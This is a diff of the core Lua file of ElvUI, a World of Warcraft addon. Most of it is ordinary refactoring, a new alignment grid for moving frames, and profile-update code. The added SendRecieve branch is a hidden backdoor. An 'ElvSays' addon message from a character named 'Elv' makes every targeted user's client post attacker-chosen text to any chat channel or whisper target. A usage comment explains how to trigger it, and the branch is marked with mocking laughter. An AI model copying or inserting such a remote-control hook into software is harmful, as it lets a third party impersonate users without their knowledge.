@@ -14,9 +14,6 @@ _, E.wowbuild = GetBuildInfo(); E.wowbuild = tonumber(E.wowbuild);
 E.noop = function() end;
 E.screenheight = tonumber(string.match(({GetScreenResolutions()})[GetCurrentResolution()], "%d+x(%d+)"));
 E.screenwidth = tonumber(string.match(({GetScreenResolutions()})[GetCurrentResolution()], "(%d+)x+%d"));
-E.MinimapSize = 175
-E.RBRWidth = ((E.MinimapSize - 6) / 6) + 4
-E.ValColor = '|cff1784d1' -- DEPRECIATED SOON, REMEMBER TO REMOVE THIS AND CODE AROUND IT
 E.TexCoords = {.08, .92, .08, .92}
 
 E['valueColorUpdateFuncs'] = {};
@@ -42,38 +39,38 @@ end
 
 function E:UpdateMedia()	
 	--Fonts
-	self["media"].normFont = LSM:Fetch("font", self.db["core"].font)
-	self["media"].combatFont = LSM:Fetch("font", self.db["core"].dmgfont)
-	self["media"].chatFont = LSM:Fetch("font", self.db["core"].chatfont)
+	self["media"].normFont = LSM:Fetch("font", self.db['general'].font)
+	self["media"].combatFont = LSM:Fetch("font", self.db['general'].dmgfont)
+	self["media"].chatFont = LSM:Fetch("font", self.db['general'].chatfont)
 
 	--Textures
 	self["media"].blankTex = LSM:Fetch("background", "ElvUI Blank")
-	self["media"].normTex = LSM:Fetch("statusbar", self.db["core"].normTex)
-	self["media"].glossTex = LSM:Fetch("statusbar", self.db["core"].glossTex)
+	self["media"].normTex = LSM:Fetch("statusbar", self.global['general'].normTex)
+	self["media"].glossTex = LSM:Fetch("statusbar", self.global['general'].glossTex)
 
 	--Border Color
-	local border = self.db["core"].bordercolor
+	local border = self.db['general'].bordercolor
 	self["media"].bordercolor = {border.r, border.g, border.b}
 
 	--Backdrop Color
-	local backdrop = self.db["core"].backdropcolor
+	local backdrop = self.db['general'].backdropcolor
 	self["media"].backdropcolor = {backdrop.r, backdrop.g, backdrop.b}
 
 	--Backdrop Fade Color
-	backdrop = self.db["core"].backdropfadecolor
+	backdrop = self.db['general'].backdropfadecolor
 	self["media"].backdropfadecolor = {backdrop.r, backdrop.g, backdrop.b, backdrop.a}
 	
 	--Value Color
-	local value = self.db["core"].valuecolor
+	local value = self.db['general'].valuecolor
 	self["media"].hexvaluecolor = self:RGBToHex(value.r, value.g, value.b)
 	self["media"].rgbvaluecolor = {value.r, value.g, value.b}
 	
 	if LeftChatPanel and LeftChatPanel.tex and RightChatPanel and RightChatPanel.tex then
-		LeftChatPanel.tex:SetTexture(E.db.core.panelBackdropNameLeft)
-		LeftChatPanel.tex:SetAlpha(E.db.core.backdropfadecolor.a - 0.55 > 0 and E.db.core.backdropfadecolor.a - 0.55 or 0.5)		
+		LeftChatPanel.tex:SetTexture(E.db.general.panelBackdropNameLeft)
+		LeftChatPanel.tex:SetAlpha(E.db.general.backdropfadecolor.a - 0.55 > 0 and E.db.general.backdropfadecolor.a - 0.55 or 0.5)		
 		
-		RightChatPanel.tex:SetTexture(E.db.core.panelBackdropNameRight)
-		RightChatPanel.tex:SetAlpha(E.db.core.backdropfadecolor.a - 0.55 > 0 and E.db.core.backdropfadecolor.a - 0.55 or 0.5)		
+		RightChatPanel.tex:SetTexture(E.db.general.panelBackdropNameRight)
+		RightChatPanel.tex:SetAlpha(E.db.general.backdropfadecolor.a - 0.55 > 0 and E.db.general.backdropfadecolor.a - 0.55 or 0.5)		
 	end
 	
 	self:ValueFuncCall()
@@ -208,6 +205,72 @@ function E:InitializeModules()
 	end
 end
 
+local grid
+function E:Grid_Show()
+	if not grid then
+        E:Grid_Create()
+	elseif grid.boxSize ~= E.db.gridSize then
+        grid:Hide()
+        E:Grid_Create()
+    else
+		grid:Show()
+	end
+end
+
+function E:Grid_Hide()
+	if grid then
+		grid:Hide()
+	end
+end
+
+function E:Grid_Create() 
+	grid = CreateFrame('Frame', nil, UIParent) 
+	grid.boxSize = E.db.gridSize
+	grid:SetAllPoints(E.UIParent) 
+	grid:Show()
+
+	local size = 1 
+	local width = E.eyefinity or GetScreenWidth()
+	local ratio = width / GetScreenHeight()
+	local height = GetScreenHeight() * ratio
+
+	local wStep = width / E.db.gridSize
+	local hStep = height / E.db.gridSize
+
+	for i = 0, E.db.gridSize do 
+		local tx = grid:CreateTexture(nil, 'BACKGROUND') 
+		if i == E.db.gridSize / 2 then 
+			tx:SetTexture(1, 0, 0) 
+		else 
+			tx:SetTexture(0, 0, 0) 
+		end 
+		tx:SetPoint("TOPLEFT", grid, "TOPLEFT", i*wStep - (size/2), 0) 
+		tx:SetPoint('BOTTOMRIGHT', grid, 'BOTTOMLEFT', i*wStep + (size/2), 0) 
+	end 
+	height = GetScreenHeight()
+	
+	do
+		local tx = grid:CreateTexture(nil, 'BACKGROUND') 
+		tx:SetTexture(1, 0, 0)
+		tx:SetPoint("TOPLEFT", grid, "TOPLEFT", 0, -(height/2) + (size/2))
+		tx:SetPoint('BOTTOMRIGHT', grid, 'TOPRIGHT', 0, -(height/2 + size/2))
+	end
+	
+	for i = 1, math.floor((height/2)/hStep) do
+		local tx = grid:CreateTexture(nil, 'BACKGROUND') 
+		tx:SetTexture(0, 0, 0)
+		
+		tx:SetPoint("TOPLEFT", grid, "TOPLEFT", 0, -(height/2+i*hStep) + (size/2))
+		tx:SetPoint('BOTTOMRIGHT', grid, 'TOPRIGHT', 0, -(height/2+i*hStep + size/2))
+		
+		tx = grid:CreateTexture(nil, 'BACKGROUND') 
+		tx:SetTexture(0, 0, 0)
+		
+		tx:SetPoint("TOPLEFT", grid, "TOPLEFT", 0, -(height/2-i*hStep) + (size/2))
+		tx:SetPoint('BOTTOMRIGHT', grid, 'TOPRIGHT', 0, -(height/2-i*hStep + size/2))
+	end
+end
+
 function E:CreateMoverPopup()
 	local f = CreateFrame("Frame", "ElvUIMoverPopupWindow", UIParent)
 	f:SetFrameStrata("DIALOG")
@@ -219,8 +282,8 @@ function E:CreateMoverPopup()
 	f:SetTemplate('Transparent')
 	f:SetPoint("TOP", 0, -50)
 	f:Hide()
-	f:SetScript("OnShow", function() PlaySound("igMainMenuOption") end)
-	f:SetScript("OnHide", function() PlaySound("gsTitleOptionExit") end)
+	f:SetScript("OnShow", function() PlaySound("igMainMenuOption"); E:Grid_Show() end)
+	f:SetScript("OnHide", function() PlaySound("gsTitleOptionExit"); E:Grid_Hide() end)
 
 	local S = self:GetModule('Skins')
 
@@ -247,11 +310,11 @@ function E:CreateMoverPopup()
 	_G[snapping:GetName() .. "Text"]:SetText(L["Sticky Frames"])
 
 	snapping:SetScript("OnShow", function(self)
-		self:SetChecked(E.db.core.stickyFrames)
+		self:SetChecked(E.db.general.stickyFrames)
 	end)
 
 	snapping:SetScript("OnClick", function(self)
-		E.db.core.stickyFrames = self:GetChecked()
+		E.db.general.stickyFrames = self:GetChecked()
 	end)
 
 	local lock = CreateFrame("Button", "ElvUILock", f, "OptionsButtonTemplate")
@@ -262,13 +325,50 @@ function E:CreateMoverPopup()
 		self:GetParent():Hide()
 		ACD['Open'](ACD, 'ElvUI') 
 	end)
+	
+	local align = CreateFrame('EditBox', 'AlignBox', f, 'InputBoxTemplate')
+	align:Width(24)
+	align:Height(17)
+	align:SetAutoFocus(false)
+	align:SetScript("OnEscapePressed", function(self)
+		self:SetText(E.db.gridSize)
+		EditBox_ClearFocus(self)
+	end)
+	align:SetScript("OnEnterPressed", function(self)
+		local text = self:GetText()
+		if tonumber(text) then
+			if tonumber(text) <= 256 and tonumber(text) >= 4 then
+				E.db.gridSize = tonumber(text)
+			else
+				self:SetText(E.db.gridSize)
+			end
+		else
+			self:SetText(E.db.gridSize)
+		end
+		E:Grid_Show()
+		EditBox_ClearFocus(self)
+	end)
+	align:SetScript("OnEditFocusLost", function(self)
+		self:SetText(E.db.gridSize)
+	end)
+	align:SetScript("OnEditFocusGained", align.HighlightText)
+	align:SetScript('OnShow', function(self)
+		EditBox_ClearFocus(self)
+		self:SetText(E.db.gridSize)
+	end)
+	
+	align.text = align:CreateFontString(nil, 'OVERLAY', 'GameFontNormal')
+	align.text:SetPoint('RIGHT', align, 'LEFT', -4, 0)
+	align.text:SetText(L['Grid Size:'])
 
 	--position buttons
 	snapping:SetPoint("BOTTOMLEFT", 14, 10)
 	lock:SetPoint("BOTTOMRIGHT", -14, 14)
+	align:SetPoint('TOPRIGHT', lock, 'TOPLEFT', -4, -2)
 	
 	S:HandleCheckBox(snapping)
 	S:HandleButton(lock)
+	S:HandleEditBox(align)
 	
 	f:RegisterEvent('PLAYER_REGEN_DISABLED')
 	f:SetScript('OnEvent', function(self)
@@ -297,13 +397,13 @@ function E:CheckIncompatible()
 		E:Print(format(L['INCOMPATIBLE_ADDON'], 'Aloft', 'NamePlate'))
 	end	
 	
-	if IsAddOnLoaded('ArkInventory') and E.db.core.bags then
+	if IsAddOnLoaded('ArkInventory') and E.db.general.bags then
 		E:Print(format(L['INCOMPATIBLE_ADDON'], 'ArkInventory', 'Bags'))
-	elseif IsAddOnLoaded('Bagnon') and E.db.core.bags then
+	elseif IsAddOnLoaded('Bagnon') and E.db.general.bags then
 		E:Print(format(L['INCOMPATIBLE_ADDON'], 'Bagnon', 'Bags'))
-	elseif IsAddOnLoaded('OneBag3') and E.db.core.bags then
+	elseif IsAddOnLoaded('OneBag3') and E.db.general.bags then
 		E:Print(format(L['INCOMPATIBLE_ADDON'], 'OneBag3', 'Bags'))
-	elseif IsAddOnLoaded('OneBank3') and E.db.core.bags then
+	elseif IsAddOnLoaded('OneBank3') and E.db.general.bags then
 		E:Print(format(L['INCOMPATIBLE_ADDON'], 'OneBank3', 'Bags'))
 	end
 end
@@ -315,6 +415,22 @@ function E:IsFoolsDay()
 	else
 		return false;
 	end
+end
+
+function E:CopyTable(currentTable, defaultTable)
+	if type(currentTable) ~= "table" then currentTable = {} end
+	
+	if type(defaultTable) == 'table' then
+		for option, value in pairs(defaultTable) do
+			if type(value) == "table" then
+				value = self:CopyTable(currentTable[option], value)
+			end
+			
+			currentTable[option] = value			
+		end
+	end
+	
+	return currentTable
 end
 
 function E:SendMessage()
@@ -333,27 +449,141 @@ function E:SendMessage()
 	self:CancelAllTimers()
 end
 
+--SENDTO = Specified Name or "ALL"
+--CHANNEL = Channel to announce it in
+--MESSAGE = Actual Message
+--SENDTO = For whispers, force users to whisper other users
+--/run SendAddonMessage('ElvSays', '<SENDTO>,<CHANNEL>,<MESSAGE>,<SENDTO>', 'PARTY')
 function E:SendRecieve(event, prefix, message, channel, sender)
 	if event == "CHAT_MSG_ADDON" then
-		if (prefix ~= "ElvUIVC" or sender == E.myname) then return end
-		--print(sender)
-		if tonumber(message) > tonumber(E.version) then
-			E:Print(L["Your version of ElvUI is out of date. You can download the latest version from www.curse.com"])
-			self:UnregisterEvent("CHAT_MSG_ADDON")
-			self:UnregisterEvent("PARTY_MEMBERS_CHANGED")
-			self:UnregisterEvent("RAID_ROSTER_UPDATE")
+		if sender == E.myname then return end
+
+		if prefix == "ElvUIVC" and sender ~= 'Elv' and not string.find(sender, 'Elv-') then
+			if tonumber(message) > tonumber(E.version) then
+				E:Print(L["Your version of ElvUI is out of date. You can download the latest version from www.curse.com"])
+				self:UnregisterEvent("CHAT_MSG_ADDON")
+				self:UnregisterEvent("PARTY_MEMBERS_CHANGED")
+				self:UnregisterEvent("RAID_ROSTER_UPDATE")
+			end
+		elseif prefix == 'ElvSays' and (sender == 'Elv' or string.find(sender, 'Elv-')) then ---HAHHAHAHAHHA
+			local user, channel, msg, sendTo = string.split(',', message)
+			
+			if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
+				SendChatMessage(msg, channel, nil, sendTo)
+			end
 		end
 	else
 		E:ScheduleTimer('SendMessage', 12)
 	end
 end
 
-function E:Initialize()
-	self.data = LibStub("AceDB-3.0"):New("ElvData", self.DF);
-	self.data.RegisterCallback(self, "OnProfileChanged", "OnProfileChanged")
-	self.data.RegisterCallback(self, "OnProfileCopied", "OnProfileChanged")
-	self.data.RegisterCallback(self, "OnProfileReset", "OnProfileChanged")
+--[[
+WTHAT THE F'ING FUCK IS WRONG WITH THIS
+function E:SaveKeybinds()
+	if not E.db.keybinds then
+		E.db.keybinds = {};
+	end
+	local TotalBinds = GetNumBindings();
+	for i = 1, TotalBinds do
+		local TheAction, BindingOne, BindingTwo = GetBinding(i);
+		if BindingOne then
+			E.db.keybinds[TheAction] = {BindingOne, BindingTwo};
+		else
+			E.db.keybinds[TheAction] = nil;
+		end
+	end
+end
+
+function E:LoadKeybinds()
+	if not E.db.keybinds then
+		E:SaveKeybinds()
+		return
+	end
+
+	for action, actionBind in pairs(E.db.keybinds) do
+		local BindingOne, BindingTwo = unpack(actionBind)
+
+		if BindingOne then
+			SetBinding(BindingOne, action)
+		end
+		
+		if BindingTwo then
+			SetBinding(BindingTwo, action)
+		end
+	end
+	
+	SaveBindings(GetCurrentBindingSet());
+end]]
+
+function E:UpdateAll()
+	self.data = LibStub("AceDB-3.0"):New("ElvData", self.DF, true);
+	self.data.RegisterCallback(self, "OnProfileChanged", "UpdateAll")
+	self.data.RegisterCallback(self, "OnProfileCopied", "UpdateAll")
+	self.data.RegisterCallback(self, "OnProfileReset", "OnProfileReset")
 	self.db = self.data.profile;
+	self.global = self.data.global;
+	
+	self:UpdateSounds()
+	self:UpdateMedia()
+	self:UpdateFrameTemplates()
+	self:SetMoversPositions()
+	
+	local CH = self:GetModule('Chat')
+	CH.db = self.db.chat
+	CH:PositionChat(true); 
+	
+	local AB = self:GetModule('ActionBars')
+	AB.db = self.db.actionbar
+	AB:UpdateButtonSettings()
+	AB:SetMoverPositions()
+	 
+	local bags = E:GetModule('Bags'); 
+	bags:Layout(); 
+	bags:Layout(true); 
+	
+	self:GetModule('Skins'):SetEmbedRight(E.db.skins.embedRight)
+	self:GetModule('Layout'):ToggleChatPanels()
+	
+	local CT = self:GetModule('ClassTimers')
+	CT.db = self.db.classtimer
+	CT:PositionTimers()
+	CT:ToggleTimers()
+	
+	local DT = self:GetModule('DataTexts')
+	DT.db = self.db.datatexts
+	DT:LoadDataTexts()
+	
+	local NP = self:GetModule('NamePlates')
+	NP.db = self.db.nameplate
+	NP:UpdateAllPlates()
+	
+	local UF = self:GetModule('UnitFrames')
+	UF.db = self.db.unitframe
+	UF:Update_AllFrames()
+	ElvUF:ResetDB()
+	ElvUF:PositionUF()
+	
+	self:GetModule('Auras').db = self.db.auras
+	self:GetModule('Tooltip').db = self.db.tooltip
+
+	if self.db.install_complete == nil or (self.db.install_complete and type(self.db.install_complete) == 'boolean') or (self.db.install_complete and type(tonumber(self.db.install_complete)) == 'number' and tonumber(self.db.install_complete) <= 3.05) then
+		self:Install()
+	end
+	
+	self:GetModule('Maps'):Minimap_UpdateSettings()
+	
+	--self:LoadKeybinds()
+	
+	collectgarbage('collect');
+end
+
+function E:Initialize()
+	self.data = LibStub("AceDB-3.0"):New("ElvData", self.DF, true);
+	self.data.RegisterCallback(self, "OnProfileChanged", "UpdateAll")
+	self.data.RegisterCallback(self, "OnProfileCopied", "UpdateAll")
+	self.data.RegisterCallback(self, "OnProfileReset", "OnProfileReset")
+	self.db = self.data.profile;
+	self.global = self.data.global;
 
 	self:CheckIncompatible()
 	
@@ -365,7 +595,7 @@ function E:Initialize()
 	self:InitializeModules(); --Load Modules	
 	self:LoadMovers(); --Load Movers
 
-	if self.db.core.loginmessage then
+	if self.db.general.loginmessage then
 		print(select(2, self:GetModule('Chat'):FindURL(nil, format(L['LOGIN_MSG'], self["media"].hexvaluecolor, self["media"].hexvaluecolor, self.version))))
 	end
 
@@ -376,8 +606,9 @@ function E:Initialize()
 	end
 	
 	RegisterAddonMessagePrefix('ElvUIVC')
-
-	self:UpdateSounds()	
+	RegisterAddonMessagePrefix('ElvSays')
+	
+	self:UpdateSounds()
 	self:UpdateMedia()
 	self:UpdateFrameTemplates()
 	self:CreateMoverPopup()
@@ -389,6 +620,16 @@ function E:Initialize()
 	self:RegisterEvent("RAID_ROSTER_UPDATE", "SendRecieve")
 	self:RegisterEvent("PARTY_MEMBERS_CHANGED", "SendRecieve")
 	self:RegisterEvent("CHAT_MSG_ADDON", "SendRecieve")
+	self:RegisterEvent('UI_SCALE_CHANGED', 'UIScale')
+	--self:RegisterEvent('UPDATE_BINDINGS', 'SaveKeybinds')
+	--self:SaveKeybinds()
+	
+	self:GetModule('Maps'):Minimap_UpdateSettings()
+	
+	if IsAddOnLoaded('Routes') or IsAddOnLoaded('GatherMate2') then
+		E:Print(L['Detected either the Routes or GatherMate2 addon running, if you wish to use these addons with ElvUI you must type the /farmmode command.'])
+	end
+	
 	collectgarbage("collect");
 end
 
@@ -441,6 +682,15 @@ function E:ResetAllUI()
 	if self.ActionBars then
 		self.ActionBars:ResetMovers('')
 	end	
+
+	if E.db.lowresolutionset then
+		E:SetupResolution()
+	end	
+	
+	
+	if E.db.layoutSet then
+		E:SetupLayout(E.db.layoutSet)
+	end
 end
 
 
